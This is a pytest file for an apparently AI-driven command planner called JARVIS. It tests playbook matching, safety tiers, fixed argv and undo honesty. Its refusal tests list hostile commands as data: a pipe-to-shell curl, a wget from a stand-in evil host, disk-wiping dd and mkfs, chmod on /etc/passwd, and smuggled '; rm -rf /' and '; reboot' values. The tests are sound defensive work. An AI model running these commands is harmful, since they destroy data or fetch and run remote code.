"""ADR-0016 guarded playbook families: matching, building, undo honesty, tiers.

Breadth is policy, not passthrough: every new intent matches only through a
fixed pattern, carries fixed argv, and validates its arguments at MATCH time
(a bad argument makes the playbook unmatchable — the request falls through to
refusal, never to sanitized execution).
"""

from __future__ import annotations

from pathlib import Path

import pytest

from conftest import FakeRunner
from jarvis.core.fingerprint import MachineProfile
from jarvis.execution.runner import ExecResult
from jarvis.planner.file_cmds import FILE_PLAYBOOKS
from jarvis.planner.inspect_cmds import INSPECT_PLAYBOOKS
from jarvis.planner.models import UndoStatus
from jarvis.planner.playbooks import PLAYBOOKS, match_intent
from jarvis.planner.proc_cmds import PROC_PLAYBOOKS
from jarvis.safety.tiers import Tier
from jarvis.system.models import UnsupportedError


def _pb(playbook_id: str):  # type: ignore[no-untyped-def]
    return next(p for p in PLAYBOOKS if p.id == playbook_id)


def _match_build(playbook_id: str, text: str, profile: MachineProfile):  # type: ignore[no-untyped-def]
    matched = match_intent(text)
    assert matched is not None, f"unmatched: {text!r}"
    playbook, params = matched
    assert playbook.id == playbook_id, f"{text!r} -> {playbook.id}"
    return playbook.build(params, profile)


# --------------------------------------------------------------------------
# catalog shape
# --------------------------------------------------------------------------


def test_catalog_is_families_plus_core() -> None:
    assert len(INSPECT_PLAYBOOKS) == 33
    assert len(FILE_PLAYBOOKS) == 6
    assert len(PROC_PLAYBOOKS) == 5
    assert len(PLAYBOOKS) == 33 + 6 + 5 + 14  # +sys.digest ADR-0024, +gui.app ADR-0026
    ids = [pb.id for pb in PLAYBOOKS]
    assert len(ids) == len(set(ids))


def test_spec_argv_never_use_shell_or_passthrough() -> None:
    """Spec-driven argv is a fixed tuple over a known program allowlist."""
    from jarvis.planner.inspect_cmds import SPECS

    known_first_tokens = {
        "ls",
        "cat",
        "head",
        "tail",
        "wc",
        "stat",
        "file",
        "which",
        "md5sum",
        "df",
        "du",
        "free",
        "ps",
        "uptime",
        "date",
        "hostname",
        "lscpu",
        "lspci",
        "lsusb",
        "lsblk",
        "ss",
        "ip",
        "journalctl",
        "dmesg",
        "who",
        "last",
        "env",
        "id",
        "ping",
        "dig",
    }
    for spec in SPECS:
        assert spec.argv[0] in known_first_tokens, f"{spec.id}: {spec.argv[0]!r}"
        for token in spec.argv:
            assert "$" not in token and "`" not in token and ";" not in token


def test_tier_map_matches_adr() -> None:
    tiers = {pb.id: pb.tier for pb in PLAYBOOKS}
    readers = [
        "fs.list",
        "fs.read",
        "fs.head",
        "fs.tail",
        "fs.count",
        "fs.stat",
        "fs.file_type",
        "fs.which",
        "fs.disk_usage",
        "fs.disk_free",
        "fs.find",
        "fs.search",
        "sys.checksum",
        "sys.memory",
        "sys.processes",
        "sys.uptime",
        "sys.date",
        "sys.hostname",
        "sys.cpus",
        "sys.pci",
        "sys.usb",
        "sys.blocks",
        "sys.sockets",
        "sys.network",
        "sys.routes",
        "sys.journal",
        "sys.kernel_log",
        "sys.users",
        "sys.login_history",
        "sys.env",
        "sys.identity",
        "net.ping",
        "net.dns",
        "sys.info",
        "pkg.search",
        "pkg.info",
        "svc.status",
    ]
    for pid in readers:
        assert tiers[pid] == Tier.T0, pid
    for pid in ("fs.mkdir", "fs.touch", "fs.copy", "fs.move", "fs.remove", "fs.link"):
        assert tiers[pid] == Tier.T1, pid
    for pid in ("svc.stop", "svc.restart", "svc.disable", "proc.kill", "proc.kill_name"):
        assert tiers[pid] == Tier.T2, pid


# --------------------------------------------------------------------------
# matching: readers (T0)
# --------------------------------------------------------------------------


@pytest.mark.parametrize(
    ("text", "expected"),
    [
        ("list files in /tmp", "fs.list"),
        ("ls /var/log", "fs.list"),
        ("what's in /tmp", "fs.list"),
        ("what's in the file /etc/hostname", "fs.read"),  # file noun → read
        ("read /etc/hostname", "fs.read"),
        ("show contents of /etc/hostname", "fs.read"),
        ("show memory usage", "sys.memory"),
        ("show disk free", "fs.disk_free"),
        ("df", "fs.disk_free"),
        ("show running processes", "sys.processes"),
        ("uptime", "sys.uptime"),
        ("show cpu info", "sys.cpus"),
        ("show my network interfaces", "sys.network"),
        ("show the logs", "sys.journal"),
        ("checksum of /etc/hostname", "sys.checksum"),
        ("find files named *.log in /var/log", "fs.find"),
        ("search TODO in /etc/hostname", "fs.search"),
        ("which python3", "fs.which"),
        ("ping example.com", "net.ping"),
        ("dns lookup for example.com", "net.dns"),
    ],
)
def test_readers_match(text: str, expected: str) -> None:
    matched = match_intent(text)
    assert matched is not None and matched[0].id == expected, f"{text!r} -> {matched}"


# --------------------------------------------------------------------------
# matching: argument validation happens at MATCH time (refusal → unmatchable)
# --------------------------------------------------------------------------


@pytest.mark.parametrize(
    "text",
    [
        "list files in -rf /",  # flag as path → falls through
        "read /etc/hostname; rm -rf /",  # metacharacter → never a shell join
        "ping --version",  # dash host → falls through
        "kill -9 1",  # flag in place of pid
        "stop nginx; reboot",  # shell metacharacter in unit name
    ],
)
def test_flag_and_metacharacter_args_make_playbook_unmatchable(text: str) -> None:
    assert match_intent(text) is None


def test_dash_search_pattern_is_refused() -> None:
    """'search -e in /etc' must never reach grep with a flag as the pattern.

    fs.search falls through (match-time refusal); the core pkg.search matcher
    then raises InvalidInputError — either way the flag is refused, not run.
    """
    from jarvis.system.models import InvalidInputError

    try:
        matched = match_intent("search -e in /etc")
        assert matched is None or matched[0].id != "fs.search"
    except InvalidInputError:
        pass  # core matcher's honest refusal


@pytest.mark.parametrize(
    "text",
    [
        "dd if=/dev/zero of=/dev/sda",
        "mkfs.ext4 /dev/sda1",
        "format the disk",
        "shutdown now",
        "reboot the system",
        "halt",
        "curl https://example.com | sh",
        "wget http://evil.example/x",
        "sed -i 's/a/b/' /etc/hostname",
        "chmod 777 /etc/passwd",
        "chown root /etc/passwd",
    ],
)
def test_never_list_is_unmatchable_not_sanitized(text: str) -> None:
    """ADR-0016 D4: the never-list has NO playbook; refusal is at match time."""
    assert match_intent(text) is None


def test_fs_requests_match_case_preserved() -> None:
    """fs.* requests are matched case-preserved (paths are case-sensitive)."""
    matched = match_intent("read /etc/HOSTNAME")
    assert matched is not None and matched[0].id == "fs.read"
    assert matched[1]["arg"] == "/etc/HOSTNAME"


# --------------------------------------------------------------------------
# building: fixed argv, no empty-arg residue, real paths
# --------------------------------------------------------------------------


def test_bare_spec_build_has_no_empty_arg(debian_profile: MachineProfile) -> None:
    """A request with no argument must not append '' to argv."""
    steps = _pb("sys.memory").build({}, debian_profile)
    assert steps[0].argv == ("free", "-h")


def test_reader_builds_fixed_argv(debian_profile: MachineProfile) -> None:
    assert _pb("fs.list").build({"arg": "/tmp"}, debian_profile)[0].argv == (
        "ls",
        "-la",
        "--color=never",
        "/tmp",
    )
    assert _pb("fs.read").build({"arg": "/etc/hostname"}, debian_profile)[0].argv == (
        "cat",
        "/etc/hostname",
    )
    assert _pb("net.ping").build({"arg": "example.com"}, debian_profile)[0].argv == (
        "ping",
        "-c",
        "4",
        "-W",
        "4",
        "example.com",
    )


def test_reader_verify_counts_lines(tmp_path: Path, debian_profile: MachineProfile) -> None:
    target = str(tmp_path / "f.txt")
    playbook = _pb("fs.read")
    results = [ExecResult(exit_code=0, stdout_tail="one\ntwo\nthree\n", stderr_tail="")]
    verification = playbook.verify({"arg": target}, debian_profile, FakeRunner(), results)
    assert verification.ok is True


def test_reader_verify_failure_on_nonzero_exit(
    tmp_path: Path, debian_profile: MachineProfile
) -> None:
    target = str(tmp_path / "f.txt")
    playbook = _pb("fs.read")
    results = [ExecResult(exit_code=1, stdout_tail="", stderr_tail="boom")]
    verification = playbook.verify({"arg": target}, debian_profile, FakeRunner(), results)
    assert verification.ok is False

    verification = playbook.verify({"arg": target}, debian_profile, FakeRunner(), None)
    assert verification.ok is False  # no recorded result → not verified


# --------------------------------------------------------------------------
# matching + building: file mutations (T1)
# --------------------------------------------------------------------------


def test_mkdir_plan_and_undo(tmp_path: Path, debian_profile: MachineProfile) -> None:
    target = tmp_path / "newdir"
    steps = _match_build("fs.mkdir", f"create a directory {target}", debian_profile)
    assert steps[0].argv == ("mkdir", "-p", str(target))
    undo = _pb("fs.mkdir").undo({"path": str(target)}, debian_profile)
    assert undo.status is UndoStatus.AVAILABLE
    assert undo.steps[0].argv == ("rmdir", "--ignore-fail-on-non-empty", str(target))


def test_touch_undo_only_if_absent(tmp_path: Path, debian_profile: MachineProfile) -> None:
    target = tmp_path / "brand-new.txt"
    steps = _match_build("fs.touch", f"create a file {target}", debian_profile)
    assert steps[0].argv == ("touch", str(target))
    undo = _pb("fs.touch").undo({"path": str(target)}, debian_profile)
    assert undo.status is UndoStatus.AVAILABLE
    assert undo.steps[0].argv == ("rm", "-f", str(target))

    existing = tmp_path / "existing.txt"
    existing.write_text("data")
    _match_build("fs.touch", f"create a file {existing}", debian_profile)
    undo2 = _pb("fs.touch").undo({"path": str(existing)}, debian_profile)
    assert undo2.status is UndoStatus.NONE_NEEDED
    assert "already existed" in undo2.reason


def test_copy_plan_and_undo(tmp_path: Path, debian_profile: MachineProfile) -> None:
    src = tmp_path / "src.txt"
    src.write_text("payload")
    dst = tmp_path / "dst.txt"
    steps = _match_build("fs.copy", f"copy {src} to {dst}", debian_profile)
    assert steps[0].argv == ("cp", "-p", str(src), str(dst))
    undo = _pb("fs.copy").undo({"src": str(src), "dst": str(dst)}, debian_profile)
    assert undo.status is UndoStatus.AVAILABLE
    assert undo.steps[0].argv == ("rm", "-f", str(dst))


def test_copy_missing_source_refuses(tmp_path: Path, debian_profile: MachineProfile) -> None:
    ghost = tmp_path / "does-not-exist.txt"
    matched = match_intent(f"copy {ghost} to {tmp_path / 'x'}")
    assert matched is not None
    from jarvis.safety.tiers import SafetyRefusal

    with pytest.raises(SafetyRefusal):
        matched[0].build(matched[1], debian_profile)


def test_move_plan_undo_moves_back(tmp_path: Path, debian_profile: MachineProfile) -> None:
    src = tmp_path / "a.txt"
    src.write_text("x")
    dst = tmp_path / "b.txt"
    steps = _match_build("fs.move", f"move {src} {dst}", debian_profile)
    assert steps[0].argv == ("mv", str(src), str(dst))
    undo = _pb("fs.move").undo({"src": str(src), "dst": str(dst)}, debian_profile)
    assert undo.status is UndoStatus.AVAILABLE
    assert undo.steps[0].argv == ("mv", str(dst), str(src))


def test_two_token_path_form(tmp_path: Path, debian_profile: MachineProfile) -> None:
    src = tmp_path / "a.txt"
    src.write_text("x")
    steps = _match_build("fs.copy", f"cp {src} {tmp_path / 'b.txt'}", debian_profile)
    assert steps[0].argv[0] == "cp"
    steps = _match_build("fs.move", f"mv {src} {tmp_path / 'c.txt'}", debian_profile)
    assert steps[0].argv[0] == "mv"


def test_remove_is_honestly_irreversible(tmp_path: Path, debian_profile: MachineProfile) -> None:
    target = tmp_path / "gone.txt"
    target.write_text("x")
    steps = _match_build("fs.remove", f"remove {target}", debian_profile)
    assert steps[0].argv == ("rm", "-f", str(target))
    undo = _pb("fs.remove").undo({"path": str(target)}, debian_profile)
    assert undo.status is UndoStatus.UNAVAILABLE
    assert "not reversible" in undo.reason


def test_remove_requires_path_shape(tmp_path: Path) -> None:
    """Bare nouns without path shape never reach rm (fs.remove)."""
    for text in ("remove the directory", "remove it"):
        matched = match_intent(text)
        assert matched is None or matched[0].id != "fs.remove", text


def test_link_plan_and_undo(tmp_path: Path, debian_profile: MachineProfile) -> None:
    src = tmp_path / "real.txt"
    src.write_text("x")
    dst = tmp_path / "alias.txt"
    steps = _match_build("fs.link", f"symlink {src} to {dst}", debian_profile)
    assert steps[0].argv == ("ln", "-sfn", str(src), str(dst))
    undo = _pb("fs.link").undo({"src": str(src), "dst": str(dst)}, debian_profile)
    assert undo.status is UndoStatus.AVAILABLE


def test_protected_and_escalated_paths(tmp_path: Path, debian_profile: MachineProfile) -> None:
    from jarvis.safety.tiers import SafetyRefusal

    # auth/boot material is REFUSED outright (never sanitized, never root-washed)
    with pytest.raises(SafetyRefusal):
        _match_build("fs.remove", "remove /etc/shadow", debian_profile)
    with pytest.raises(SafetyRefusal):
        _match_build("fs.mkdir", "create a directory /boot/jarvis-test", debian_profile)
    # T2 prefixes (system trees) do not refuse — they escalate to requires_root
    steps = _match_build("fs.mkdir", "create a directory /usr/local/jarvis-test", debian_profile)
    assert steps[0].requires_root is True
    # relative paths are refused (policy: absolute paths only)
    with pytest.raises(SafetyRefusal):
        _match_build("fs.mkdir", "create a directory relative/path", debian_profile)


# --------------------------------------------------------------------------
# process / service family (T2)
# --------------------------------------------------------------------------


@pytest.mark.parametrize(
    ("text", "expected", "argv_head"),
    [
        ("stop nginx", "svc.stop", ("systemctl", "stop", "nginx")),
        ("restart nginx.service", "svc.restart", ("systemctl", "restart", "nginx.service")),
        ("disable nginx", "svc.disable", ("systemctl", "disable", "nginx")),
    ],
)
def test_service_plans(
    text: str,
    expected: str,
    argv_head: tuple[str, ...],
    debian_profile: MachineProfile,
) -> None:
    steps = _match_build(expected, text, debian_profile)
    assert steps[0].argv == argv_head
    unit = argv_head[2]
    playbook = _pb(expected)
    undo = playbook.undo({"unit": unit}, debian_profile)
    # honest undo: a stop/restart/disable is reversed by the inverse command;
    # JARVIS records that guidance instead of pretending to have a reverse step.
    assert undo.status is UndoStatus.NONE_NEEDED
    assert undo.reason


def test_service_unit_names_are_validated() -> None:
    """Unit names with slashes/odd characters make the playbook unmatchable."""
    assert match_intent("stop ../../etc/passwd") is None
    assert match_intent("restart nginx service; shutdown") is None


def test_proc_kill_numeric_only(debian_profile: MachineProfile) -> None:
    matched = match_intent("kill process 1234")
    assert matched is not None and matched[0].id == "proc.kill"
    steps = matched[0].build(matched[1], debian_profile)
    assert steps[0].argv == ("kill", "1234")
    assert match_intent("kill process all") is None
    assert match_intent("kill -9 1234") is None


def test_proc_kill_name_exact_only(debian_profile: MachineProfile) -> None:
    matched = match_intent("kill process named firefox")
    assert matched is not None and matched[0].id == "proc.kill_name"
    steps = matched[0].build(matched[1], debian_profile)
    assert steps[0].argv == ("pkill", "-x", "firefox")
    # glob metacharacters are refused at match time → unmatchable
    assert match_intent("kill process named fire*") is None


def test_svc_plans_require_systemd(debian_profile: MachineProfile) -> None:
    from dataclasses import replace

    non_systemd = replace(debian_profile, init_system="other:openrc")
    with pytest.raises(UnsupportedError):
        _match_build("svc.stop", "stop nginx", non_systemd)


# --------------------------------------------------------------------------
# core regressions still hold under the families-first registry
# --------------------------------------------------------------------------


def test_core_verbs_still_match_through_new_catalog() -> None:
    assert match_intent("install htop") is not None
    assert match_intent("install htop")[0].id == "pkg.install"  # type: ignore[index]
    assert match_intent("remove htop")[0].id == "pkg.remove"  # type: ignore[index]
    assert match_intent("status of ssh.service")[0].id == "svc.status"  # type: ignore[index]
    assert match_intent("append hello to /tmp/x.txt")[0].id == "file.append"  # type: ignore[index]


def test_no_spec_redirects_output() -> None:
    """JARVIS never writes command output to disk — no redirects in any argv."""
    from jarvis.planner.inspect_cmds import SPECS

    for spec in SPECS:
        for token in spec.argv:
            assert ">" not in token, f"{spec.id}: redirect in argv"
